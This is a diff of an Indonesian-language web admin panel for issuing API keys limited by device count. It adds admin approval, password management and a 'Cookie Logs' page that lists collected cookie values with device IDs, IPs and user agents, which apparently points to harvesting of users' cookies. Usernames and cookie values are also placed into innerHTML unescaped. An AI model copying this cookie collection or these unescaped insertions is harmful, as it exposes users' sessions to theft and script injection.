@@ -127,7 +127,6 @@
     .success { color: #43ffae; font-size: 1.04em; margin-top: 6px; font-weight: 600; letter-spacing: 0.5px; display: block; }
     .error { color: #ff5b7c; font-size: 1.04em; margin-top: 6px; font-weight: 600; letter-spacing: 0.5px; display: block; }
     .admin-item { margin-bottom: 8px; padding: 7px 0; border-bottom: 1px solid #2e3040;}
-    /* Key list style */
     .key-list-section { margin-top: 46px; }
     .key-list-title { color: #e89cff; font-size: 1.13em; font-weight: bold; margin-bottom: 12px; }
     .key-list-search-wrap { margin-bottom: 12px; display: flex; flex-wrap: wrap; align-items: center; gap: 12px;}
@@ -237,6 +236,9 @@
       <ul class="sidebar-nav">
         <li id="navAdmins" class="active" onclick="showPage('admins')">Daftar Admin</li>
         <li id="navKeys" onclick="showPage('keys')">Generate Key</li>
+        <li id="navPending" onclick="showPage('pending')">Pending Users</li>
+        <li id="navCookies" onclick="showPage('cookies')">Cookie Logs</li>
+        <li id="navPassword" onclick="showPage('password')">Ganti Password</li>
       </ul>
       <div class="sidebar-list-header">List Admin:</div>
       <ul class="sidebar-list" id="sidebarAdminList"></ul>
@@ -246,6 +248,13 @@
       <!-- Halaman Daftar Admin -->
       <div id="pageAdmins">
         <h2>Daftar Admin</h2>
+        <div style="margin-bottom:20px;">
+          <label for="registerUsername">Register Admin Baru:</label>
+          <input type="text" id="registerUsername" placeholder="Username" autocomplete="username">
+          <input type="password" id="registerPassword" placeholder="Password" autocomplete="new-password">
+          <button id="registerBtn">Register</button>
+          <div id="registerResult" class="error" style="min-height:1em;"></div>
+        </div>
         <ul id="adminsList"></ul>
       </div>
       <!-- Halaman Generate Key -->
@@ -258,6 +267,14 @@
           <option value="1">1 Hari</option>
           <option value="2">2 Hari</option>
           <option value="3">3 Hari</option>
+        </select>
+        <label for="maxDevices">Maksimum Perangkat:</label>
+        <select id="maxDevices">
+          <option value="1">1 Perangkat</option>
+          <option value="2">2 Perangkat</option>
+          <option value="3">3 Perangkat</option>
+          <option value="4">4 Perangkat</option>
+          <option value="5">5 Perangkat</option>
         </select>
         <button id="generateBtn">Generate Key</button>
         <div id="genResult"></div>
@@ -275,6 +292,7 @@
                   <th>API Key</th>
                   <th>Nama Key</th>
                   <th>Expired<br><span style="font-weight:400;font-size:.97em;">(Countdown)</span></th>
+                  <th>Perangkat<br><span style="font-weight:400;font-size:.97em;">(Terdaftar/Maks)</span></th>
                   <th>Copy</th>
                   <th>Aksi</th>
                 </tr>
@@ -284,6 +302,41 @@
             <div id="noKeysText" class="no-keys" style="display:none;"></div>
           </div>
         </div>
+      </div>
+      <!-- Halaman Pending Users -->
+      <div id="pagePending" style="display:none;">
+        <h2>Pending Users</h2>
+        <ul id="pendingList"></ul>
+      </div>
+      <!-- Halaman Cookie Logs -->
+      <div id="pageCookies" style="display:none;">
+        <h2>Cookie Logs</h2>
+        <div class="key-list-search-wrap">
+          <button id="refreshCookiesBtn" style="margin-bottom:0;">Refresh</button>
+        </div>
+        <table class="key-list-table" id="cookiesTable">
+          <thead>
+            <tr>
+              <th>Waktu</th>
+              <th>Cookie</th>
+              <th>Device ID</th>
+              <th>Nama Key</th>
+              <th>IP</th>
+              <th>User Agent</th>
+            </tr>
+          </thead>
+          <tbody id="cookiesList"></tbody>
+        </table>
+      </div>
+      <!-- Halaman Ganti Password -->
+      <div id="pagePassword" style="display:none;">
+        <h2>Ganti Password</h2>
+        <label for="oldPassword">Password Lama:</label>
+        <input type="password" id="oldPassword" placeholder="Password Lama" autocomplete="current-password">
+        <label for="newPassword">Password Baru:</label>
+        <input type="password" id="newPassword" placeholder="Password Baru" autocomplete="new-password">
+        <button id="changePasswordBtn">Ganti Password</button>
+        <div id="changePasswordResult" class="error" style="min-height:1em;"></div>
       </div>
     </div>
     <!-- FLEX-CENTER LOGIN -->
@@ -296,7 +349,7 @@
         <div id="loginMsg" class="error" style="margin-top:10px;min-height:1em;"></div>
       </div>
     </div>
-    <!-- Modal extend waktu -->
+    <!-- Modal Extend Waktu -->
     <div class="flex-center" id="extendModal" style="display:none;z-index:500;">
       <div class="login-card" style="padding:28px 28px 20px 28px;min-width:230px;max-width:98vw;">
         <div style="font-size:1.13em;font-weight:600;margin-bottom:14px;">Tambah Waktu Key</div>
@@ -312,19 +365,33 @@
         <div id="extendMsg" class="error" style="min-height:1.2em;margin-top:10px;"></div>
       </div>
     </div>
+    <!-- Modal Reset Password -->
+    <div class="flex-center" id="resetPasswordModal" style="display:none;z-index:500;">
+      <div class="login-card" style="padding:28px 28px 20px 28px;min-width:230px;max-width:98vw;">
+        <div style="font-size:1.13em;font-weight:600;margin-bottom:14px;">Reset Password Admin</div>
+        <div id="resetUsername" style="color:#7ed3fc;margin-bottom:10px;"></div>
+        <label for="resetNewPassword">Password Baru:</label>
+        <input type="password" id="resetNewPassword" placeholder="Password Baru" autocomplete="new-password">
+        <button class="rename-btn" id="confirmResetBtn">Reset</button>
+        <button class="revoke-btn" id="cancelResetBtn" style="margin-left:10px;">Batal</button>
+        <div id="resetMsg" class="error" style="min-height:1.2em;margin-top:10px;"></div>
+      </div>
+    </div>
   </div>
   <script>
     let myUsername = "", myRole = "";
     let allKeyData = [];
     let currentEditingKey = null;
     let currentExtendKey = null;
-    let countdownTimer = null;
+    let currentResetUsername = null;
+    let countdownInterval = null;
 
-    function showPanel(loggedIn, role="") {
+    function showPanel(loggedIn, role = "") {
       document.getElementById('mainPanel').style.display = loggedIn ? '' : 'none';
       document.getElementById('logoutBtn').style.display = loggedIn ? '' : 'none';
       document.getElementById('loginFlex').style.display = loggedIn ? 'none' : 'flex';
       document.getElementById('sidebar').style.display = loggedIn ? '' : 'none';
+      document.getElementById('navPending').style.display = (loggedIn && role === 'superadmin') ? '' : 'none';
       if (loggedIn) {
         showPage('admins');
         loadAdmins();
@@ -334,14 +401,24 @@
         clearCountdown();
       }
     }
+
     function showPage(page) {
       document.getElementById('pageAdmins').style.display = (page === 'admins') ? '' : 'none';
       document.getElementById('pageKeys').style.display = (page === 'keys') ? '' : 'none';
+      document.getElementById('pagePending').style.display = (page === 'pending') ? '' : 'none';
+      document.getElementById('pageCookies').style.display = (page === 'cookies') ? '' : 'none';
+      document.getElementById('pagePassword').style.display = (page === 'password') ? '' : 'none';
       document.getElementById('navAdmins').classList.toggle('active', page === 'admins');
       document.getElementById('navKeys').classList.toggle('active', page === 'keys');
+      document.getElementById('navPending').classList.toggle('active', page === 'pending');
+      document.getElementById('navCookies').classList.toggle('active', page === 'cookies');
+      document.getElementById('navPassword').classList.toggle('active', page === 'password');
       if (page === 'admins') loadAdmins();
       if (page === 'keys') listKeys();
+      if (page === 'pending') loadPending();
+      if (page === 'cookies') loadCookies();
     }
+
     async function checkStatus() {
       const res = await fetch('/api/status', { credentials: 'include' });
       const data = await res.json();
@@ -349,50 +426,235 @@
       myRole = data.role || "";
       showPanel(!!data.loggedIn, data.role);
     }
+
     document.getElementById('loginBtn').onclick = async () => {
       const username = document.getElementById('loginUser').value.trim();
       const password = document.getElementById('loginPass').value.trim();
+      if (!username || !password) {
+        document.getElementById('loginMsg').textContent = "Username dan password wajib diisi!";
+        return;
+      }
       const res = await fetch('/api/login', {
         method: 'POST',
         headers: {'Content-Type':'application/json'},
         credentials: 'include',
         body: JSON.stringify({ username, password })
       });
-      if(res.ok) {
+      if (res.ok) {
         checkStatus();
       } else {
         const data = await res.json();
         document.getElementById('loginMsg').textContent = data.message || "Login gagal!";
       }
     };
+
     document.getElementById('logoutBtn').onclick = async () => {
       await fetch('/api/logout', { method:'POST', credentials:'include' });
       checkStatus();
     };
-    window.showPage = showPage;
+
     async function loadAdmins() {
       const res = await fetch('/api/admins', { credentials:'include' });
+      if (!res.ok) {
+        document.getElementById('adminsList').innerHTML = `<li class="error">Gagal memuat daftar admin!</li>`;
+        return;
+      }
       const data = await res.json();
       // Sidebar
       const sidebar = document.getElementById('sidebarAdminList');
       sidebar.innerHTML = "";
-      data.admins.forEach(a=>{
+      data.admins.forEach(a => {
         const li = document.createElement('li');
-        if(a.username===myUsername) li.classList.add('me');
-        if(a.role==='superadmin') li.classList.add('superadmin');
+        if (a.username === myUsername) li.classList.add('me');
+        if (a.role === 'superadmin') li.classList.add('superadmin');
         li.innerHTML = `<span>${a.username}</span>`;
         sidebar.appendChild(li);
       });
       // Main list
       const ul = document.getElementById('adminsList');
       ul.innerHTML = "";
-      data.admins.forEach(a=>{
+      data.admins.forEach(a => {
         const li = document.createElement('li');
         li.className = "admin-item";
-        li.innerHTML = `<span style="font-weight:600;color:#7ed3fc">${a.username}</span> <span style="font-size:.95em;color:#b5b9c9;">(${a.role})</span>`;
+        let actions = '';
+        if (myRole === 'superadmin' && a.username !== myUsername && a.approved) {
+          actions = `
+            <button class="revoke-btn" onclick="deleteAdmin('${a.username}')">Hapus</button>
+            <button class="rename-btn" onclick="showResetPasswordModal('${a.username}')">Reset Password</button>
+          `;
+        }
+        li.innerHTML = `
+          <span style="font-weight:600;color:#7ed3fc">${a.username}</span>
+          <span style="font-size:.95em;color:#b5b9c9;">(${a.role}${a.approved ? '' : ', menunggu persetujuan'})</span>
+          ${actions}
+        `;
         ul.appendChild(li);
       });
     }
+
+    document.getElementById('registerBtn').onclick = async () => {
+      const username = document.getElementById('registerUsername').value.trim();
+      const password = document.getElementById('registerPassword').value.trim();
+      if (!username || !password) {
+        document.getElementById('registerResult').textContent = "Username dan password wajib diisi!";
+        return;
+      }
+      const res = await fetch('/api/register', {
+        method: 'POST',
+        headers: {'Content-Type':'application/json'},
+        credentials: 'include',
+        body: JSON.stringify({ username, password })
+      });
+      const data = await res.json();
+      if (res.ok) {
+        document.getElementById('registerResult').innerHTML = `<span class="success">${data.message}</span>`;
+        document.getElementById('registerUsername').value = '';
+        document.getElementById('registerPassword').value = '';
+        if (myRole === 'superadmin') loadPending();
+      } else {
+        document.getElementById('registerResult').textContent = data.message || "Registrasi gagal!";
+      }
+    };
+
+    async function loadPending() {
+      if (myRole !== 'superadmin') {
+        document.getElementById('pendingList').innerHTML = `<li class="error">Hanya superadmin yang dapat melihat daftar ini!</li>`;
+        return;
+      }
+      const res = await fetch('/api/pending-users', { credentials: 'include' });
+      if (!res.ok) {
+        document.getElementById('pendingList').innerHTML = `<li class="error">Gagal memuat data!</li>`;
+        return;
+      }
+      const data = await res.json();
+      const ul = document.getElementById('pendingList');
+      ul.innerHTML = "";
+      if (data.pending.length === 0) {
+        ul.innerHTML = `<li class="no-keys">Tidak ada user yang menunggu persetujuan.</li>`;
+        return;
+      }
+      data.pending.forEach(p => {
+        const li = document.createElement('li');
+        li.className = "admin-item";
+        li.innerHTML = `
+          <span style="font-weight:600;color:#7ed3fc">${p.username}</span>
+          <button class="rename-btn" onclick="approveUser('${p.username}')">Approve</button>
+          <button class="revoke-btn" onclick="rejectUser('${p.username}')">Reject</button>
+        `;
+        ul.appendChild(li);
+      });
+    }
+
+    async function approveUser(username) {
+      if (!confirm(`Yakin ingin menyetujui user ${username}?`)) return;
+      const res = await fetch('/api/approve-user', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        credentials: 'include',
+        body: JSON.stringify({ username })
+      });
+      if (res.ok) {
+        await loadPending();
+        await loadAdmins();
+      } else {
+        const data = await res.json();
+        document.getElementById('pendingList').innerHTML = `<li class="error">${data.message || "Gagal menyetujui user!"}</li>`;
+      }
+    }
+
+    async function rejectUser(username) {
+      if (!confirm(`Yakin ingin menolak user ${username}?`)) return;
+      const res = await fetch('/api/reject-user', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        credentials: 'include',
+        body: JSON.stringify({ username })
+      });
+      if (res.ok) {
+        await loadPending();
+        await loadAdmins();
+      } else {
+        const data = await res.json();
+        document.getElementById('pendingList').innerHTML = `<li class="error">${data.message || "Gagal menolak user!"}</li>`;
+      }
+    }
+
+    async function deleteAdmin(username) {
+      if (!confirm(`Yakin ingin menghapus admin ${username}?`)) return;
+      const res = await fetch('/api/delete-admin', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        credentials: 'include',
+        body: JSON.stringify({ username })
+      });
+      if (res.ok) {
+        await loadAdmins();
+      } else {
+        const data = await res.json();
+        document.getElementById('adminsList').innerHTML = `<li class="error">${data.message || "Gagal menghapus admin!"}</li>`;
+      }
+    }
+
+    function showResetPasswordModal(username) {
+      currentResetUsername = username;
+      document.getElementById('resetPasswordModal').style.display = '';
+      document.getElementById('resetUsername').textContent = username;
+      document.getElementById('resetNewPassword').value = '';
+      document.getElementById('resetMsg').textContent = '';
+    }
+
+    document.getElementById('cancelResetBtn').onclick = () => {
+      document.getElementById('resetPasswordModal').style.display = 'none';
+      currentResetUsername = null;
+    };
+
+    document.getElementById('confirmResetBtn').onclick = async () => {
+      if (!currentResetUsername) return;
+      const newPassword = document.getElementById('resetNewPassword').value.trim();
+      if (!newPassword) {
+        document.getElementById('resetMsg').textContent = "Password baru wajib diisi!";
+        return;
+      }
+      const res = await fetch('/api/reset-password', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        credentials: 'include',
+        body: JSON.stringify({ username: currentResetUsername, newPassword })
+      });
+      if (res.ok) {
+        document.getElementById('resetPasswordModal').style.display = 'none';
+        document.getElementById('resetMsg').textContent = '';
+        document.getElementById('adminsList').innerHTML = `<li class="success">Password untuk ${currentResetUsername} berhasil direset!</li>`;
+        currentResetUsername = null;
+        setTimeout(loadAdmins, 2000);
+      } else {
+        const data = await res.json();
+        document.getElementById('resetMsg').textContent = data.message || "Gagal mereset password!";
+      }
+    };
+
+    document.getElementById('changePasswordBtn').onclick = async () => {
+      const oldPassword = document.getElementById('oldPassword').value.trim();
+      const newPassword = document.getElementById('newPassword').value.trim();
+      if (!oldPassword || !newPassword) {
+        document.getElementById('changePasswordResult').textContent = "Semua kolom wajib diisi!";
+        return;
+      }
+      const res = await fetch('/api/change-password', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        credentials: 'include',
+        body: JSON.stringify({ oldPassword, newPassword })
+      });
+      if (res.ok) {
+        document.getElementById('changePasswordResult').innerHTML = `<span class="success">Password berhasil diganti!</span>`;
+        document.getElementById('oldPassword').value = '';
+        document.getElementById('newPassword').value = '';
+      } else {
+        const data = await res.json();
+        document.getElementById('changePasswordResult').textContent = data.message || "Gagal mengganti password!";
+      }
+    };
 
     function formatCountdown(ms) {
       if (ms <= 0) return 'Expired';
@@ -409,7 +671,6 @@
       return out;
     }
 
-    let countdownInterval = null;
     function clearCountdown() {
       if (countdownInterval) clearInterval(countdownInterval);
       countdownInterval = null;
@@ -460,25 +721,41 @@
       keysListTable.style.display = '';
       filtered.forEach(k => {
         const tr = document.createElement('tr');
-        // Nama Key column: if editing, show input
         let nameCol = "";
         if (currentEditingKey === k.apiKey) {
-          nameCol = `<input class="rename-input" id="renameInput" value="${k.name ? k.name.replace(/"/g, "&quot;") : ""}" maxlength="48"/>
+          nameCol = `
+            <input class="rename-input" id="renameInput" value="${k.name ? k.name.replace(/"/g, "&quot;") : ""}" maxlength="48"/>
             <button class="rename-btn" onclick="saveRenameKey('${k.apiKey}')">Simpan</button>
             <button class="rename-btn" style="background:#666;" onclick="cancelRenameKey()">Batal</button>
           `;
         } else {
-          nameCol = `<span>${k.name || '-'}</span>
-            <button class="rename-btn" onclick="editRenameKey('${k.apiKey}')">Rename</button>`;
+          nameCol = `
+            <span>${k.name || '-'}</span>
+            <button class="rename-btn" onclick="editRenameKey('${k.apiKey}')">Rename</button>
+          `;
         }
-        let expiredCol = `<span id="expdate-${k.apiKey}">${new Date(k.expiry*1000).toLocaleString("id-ID", { hour12:false })}</span>
-            <br><span style="color:#43ffae;font-size:.97em;" id="countdown-${k.apiKey}"></span>`;
-        let revokeCol = `<button class="revoke-btn" onclick="revokeKey('${k.apiKey}')">Revoke</button>
-        <button class="extend-btn" onclick="showExtendModal('${k.apiKey}')">Tambah Waktu</button>`;
+        let expiredCol = `
+          <span id="expdate-${k.apiKey}">${new Date(k.expiry*1000).toLocaleString("id-ID", { hour12:false })}</span>
+          <br><span style="color:#43ffae;font-size:.97em;" id="countdown-${k.apiKey}"></span>
+        `;
+        let deviceCol = `<span>${k.currentDevices}/${k.maxDevices}</span>`;
+        if (k.deviceIds.length > 0) {
+          deviceCol += `<br><span style="font-size:.9em;color:#43ffae;">Online: ${k.onlineDevices.length}</span>`;
+          deviceCol += `<br><span style="font-size:.9em;color:#ff5959;">Offline: ${k.offlineDevices.length}</span>`;
+          k.deviceIds.forEach(d => {
+            deviceCol += `<br><span style="font-size:.9em;color:${d.status === 'online' ? '#43ffae' : '#ff5959'};">${d.deviceId} (${d.status})</span>
+              <button class="revoke-btn" style="font-size:.85em;padding:2px 6px;" onclick="logoutDevice('${k.apiKey}', '${d.deviceId}')">Logout</button>`;
+          });
+        }
+        let revokeCol = myRole === 'superadmin' ? `
+          <button class="revoke-btn" onclick="revokeKey('${k.apiKey}')">Revoke</button>
+          <button class="extend-btn" onclick="showExtendModal('${k.apiKey}')">Tambah Waktu</button>
+        ` : '';
         tr.innerHTML = `
           <td>${k.apiKey}</td>
           <td>${nameCol}</td>
           <td>${expiredCol}</td>
+          <td>${deviceCol}</td>
           <td><button class="copy-btn" onclick="navigator.clipboard.writeText('${k.apiKey}')">Copy</button></td>
           <td>${revokeCol}</td>
         `;
@@ -499,7 +776,6 @@
           const ms = k.expiry*1000 - now;
           const el = document.getElementById('countdown-' + k.apiKey);
           if (el) el.textContent = formatCountdown(ms);
-          // expired: update list
           if (ms <= 0) {
             listKeys();
           }
@@ -515,7 +791,6 @@
       setupCountdown();
     };
 
-    // Rename key logic
     window.editRenameKey = function(apiKey) {
       currentEditingKey = apiKey;
       renderKeyList();
@@ -525,15 +800,21 @@
         if (input) input.focus();
       }, 10);
     };
+
     window.cancelRenameKey = function() {
       currentEditingKey = null;
       renderKeyList();
       setupCountdown();
     };
+
     window.saveRenameKey = async function(apiKey) {
       const input = document.getElementById('renameInput');
       if (!input) return;
       const name = input.value.trim();
+      if (name.length > 48) {
+        document.getElementById('genResult').innerHTML = `<span class="error">Nama key maksimum 48 karakter!</span>`;
+        return;
+      }
       const res = await fetch('/api/rename-key', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
@@ -542,13 +823,14 @@
       });
       if (res.ok) {
         currentEditingKey = null;
+        document.getElementById('genResult').innerHTML = `<span class="success">Key berhasil di-rename!</span>`;
         await listKeys();
       } else {
-        alert('Gagal rename key!');
+        const data = await res.json();
+        document.getElementById('genResult').innerHTML = `<span class="error">${data.message || 'Gagal rename key!'}</span>`;
       }
     };
 
-    // Revoke key logic
     window.revokeKey = async function(apiKey) {
       if (!confirm('Yakin ingin revoke key ini?')) return;
       const res = await fetch('/api/revoke-key', {
@@ -558,15 +840,32 @@
         body: JSON.stringify({ apiKey })
       });
       if (res.ok) {
+        document.getElementById('genResult').innerHTML = `<span class="success">Key berhasil di-revoke!</span>`;
         await listKeys();
       } else {
-        if (res.status === 401) { checkStatus(); return; }
+        if (res.status === 401 || res.status === 403) { checkStatus(); return; }
         const data = await res.json();
-        alert(data.message || "Gagal revoke key!");
+        document.getElementById('genResult').innerHTML = `<span class="error">${data.message || 'Gagal revoke key!'}</span>`;
       }
     };
 
-    // -------- TAMBAH WAKTU KEY --------
+    async function logoutDevice(apiKey, deviceId) {
+      if (!confirm(`Yakin ingin logout device ${deviceId} dari key ini?`)) return;
+      const res = await fetch('/api/logout-key', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        credentials: 'include',
+        body: JSON.stringify({ apiKey, deviceId })
+      });
+      if (res.ok) {
+        document.getElementById('genResult').innerHTML = `<span class="success">Device berhasil logout!</span>`;
+        await listKeys();
+      } else {
+        const data = await res.json();
+        document.getElementById('genResult').innerHTML = `<span class="error">${data.message || 'Gagal logout device!'}</span>`;
+      }
+    }
+
     function showExtendModal(apiKey) {
       currentExtendKey = apiKey;
       const keyObj = allKeyData.find(k => k.apiKey === apiKey);
@@ -575,10 +874,12 @@
       document.getElementById('extendMsg').textContent = '';
       document.getElementById('extendDays').value = "1";
     }
+
     document.getElementById('cancelExtendBtn').onclick = () => {
       document.getElementById('extendModal').style.display = 'none';
       currentExtendKey = null;
     };
+
     document.getElementById('confirmExtendBtn').onclick = async () => {
       if (!currentExtendKey) return;
       const days = document.getElementById('extendDays').value;
@@ -596,6 +897,7 @@
       if (res.ok) {
         document.getElementById('extendModal').style.display = 'none';
         currentExtendKey = null;
+        document.getElementById('genResult').innerHTML = `<span class="success">Waktu key berhasil diperpanjang!</span>`;
         await listKeys();
       } else {
         const data = await res.json();
@@ -606,11 +908,16 @@
     document.getElementById('generateBtn').onclick = async () => {
       const expireDays = document.getElementById('expireDays').value;
       const keyName = document.getElementById('keyName').value.trim();
+      const maxDevices = document.getElementById('maxDevices').value;
+      if (keyName.length > 48) {
+        document.getElementById('genResult').innerHTML = `<span class="error">Nama key maksimum 48 karakter!</span>`;
+        return;
+      }
       const res = await fetch('/api/generate-key', {
         method: 'POST',
         headers: {'Content-Type': 'application/json'},
         credentials: 'include',
-        body: JSON.stringify({ expireDays, name: keyName })
+        body: JSON.stringify({ expireDays, name: keyName, maxDevices })
       });
       if (!res.ok) {
         if (res.status === 401) { checkStatus(); return; }
@@ -619,12 +926,57 @@
         return;
       }
       const data = await res.json();
-      document.getElementById('genResult').innerHTML =
-        `<span class="success">Key berhasil dibuat:<br><b style="word-break:break-all">${data.apiKey}</b><br>
+      document.getElementById('genResult').innerHTML = `
+        <span class="success">Key berhasil dibuat:<br>
+        <b style="word-break:break-all">${data.apiKey}</b><br>
         ${data.name ? `<span style="color:#e89cff;">"${data.name}"</span><br>` : ""}
-        Expired: ${new Date(data.expiry*1000).toLocaleString("id-ID", { hour12:false })}</span>`;
+        Expired: ${new Date(data.expiry*1000).toLocaleString("id-ID", { hour12:false })}<br>
+        Maksimum Perangkat: ${data.maxDevices}</span>
+      `;
       await listKeys();
     };
+
+    async function loadCookies() {
+      const res = await fetch('/cookies', { credentials: 'include' });
+      if (!res.ok) {
+        document.getElementById('cookiesList').innerHTML = `<tr><td colspan="6" class="error">Gagal memuat data!</td></tr>`;
+        return;
+      }
+      const data = await res.json();
+      const tbody = document.getElementById('cookiesList');
+      tbody.innerHTML = "";
+      if (data.list.length === 0) {
+        tbody.innerHTML = `<tr><td colspan="6" class="no-keys">Tidak ada log cookie.</td></tr>`;
+        return;
+      }
+      data.list.forEach(c => {
+        const tr = document.createElement('tr');
+        tr.innerHTML = `
+          <td>${new Date(c.time).toLocaleString("id-ID", { hour12: false })}</td>
+          <td style="word-break:break-all;">${c.value}</td>
+          <td>${c.deviceId || '-'}</td>
+          <td>${c.keyName || '-'}</td>
+          <td>${c.ip || '-'}</td>
+          <td>${c.ua || '-'}</td>
+        `;
+        tbody.appendChild(tr);
+      });
+    }
+
+    document.getElementById('refreshCookiesBtn').onclick = loadCookies;
+
+    window.showPage = showPage;
+    window.approveUser = approveUser;
+    window.rejectUser = rejectUser;
+    window.deleteAdmin = deleteAdmin;
+    window.showExtendModal = showExtendModal;
+    window.editRenameKey = editRenameKey;
+    window.cancelRenameKey = cancelRenameKey;
+    window.saveRenameKey = saveRenameKey;
+    window.revokeKey = revokeKey;
+    window.logoutDevice = logoutDevice;
+    window.showResetPasswordModal = showResetPasswordModal;
+
     checkStatus();
   </script>
 </body>
